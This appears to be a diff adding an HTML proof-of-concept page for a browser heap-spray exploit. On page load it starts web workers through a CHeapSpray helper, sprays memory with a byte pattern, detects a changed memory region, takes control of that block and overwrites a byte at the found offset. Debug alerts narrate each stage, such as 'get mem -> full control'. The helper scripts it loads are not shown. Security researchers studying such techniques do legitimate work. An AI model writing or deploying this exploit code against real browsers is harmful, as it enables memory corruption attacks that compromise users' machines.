@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+
+<script src="MemoryPatchHandler.js"></script>
+<script src="HeapAllocatorWorker.js"></script>
+<script src="HeapSpray.js"></script>
+
+<script>
+    var HEAP_SPRAY_LVL = 3;//var WORKERS_COUNT = 0x8; == 1 << HEAP_SPRAY_LVL;
+	var gErr = 0;
+	
+	var m_workersCount = 0;
+	
+	var gPatchPos;
+	var gTargetMemoryBlock = 0;
+
+	function WebWorkerFail(e)
+	{
+		gErr++
+		document.getElementById("err").innerHTML = gErr;
+	}
+		
+	function WebWorkerDone(e)
+	{
+		data = e.data;
+		if ("undefined" != typeof data.cmd)
+		{
+			switch (data.cmd)
+			{
+				case HEAP_SPRAY:
+					if ("undefined" != typeof data.id)
+					{
+						var scanning = CHeapSpray.StartScanMemory(data.id);
+						if (!scanning)
+							alert("scan fail on thread : " + data.id);
+					}
+					break;
+				case HEAP_SCAN:
+					alert("scaning active on thread : " + data.id);
+					break;
+					
+				case MEMORY_CHANGED:
+					alert("MeMoRy ChAnGED!! w8 for obtaining memory!");
+					gPatchPos = data.pos + data.ind;
+					var obtain_mem = CHeapSpray.GetMemory(data.id);
+					for (var i = 0; i < m_workersCount; i++)
+						if (i != data.id || !obtain_mem)
+							CHeapSpray.GetMemory(i);//free browser resources
+					break;
+			}
+		}
+		else
+		{
+			alert("get mem -> full control, check before change");
+			if (gTargetMemoryBlock)
+				return;
+			gTargetMemoryBlock = new Uint8Array(data);
+			
+			document.getElementById("state").innerHTML = gTargetMemoryBlock[gPatchPos];
+			
+			gTargetMemoryBlock[gPatchPos] = 0x66;
+			alert("get mem -> after change");
+		}
+	}
+		
+    function heapspray_me()
+    {
+        m_workersCount = CHeapSpray.Init(HEAP_SPRAY_LVL, WebWorkerDone, WebWorkerFail);
+
+        CHeapSpray.StartSpraying([0x23, 0x65, 0x61, 0x70,], 2, 0);
+    }
+</script>
+
+<head>
+    <title></title>
+</head>
+<body onload="heapspray_me()">
+
+<p>Thread errors: [<output id="err">0</output>]</p>
+<p>Detected change: <output id="state">stara blazkova</output></p>
+
+</body>
+</html>
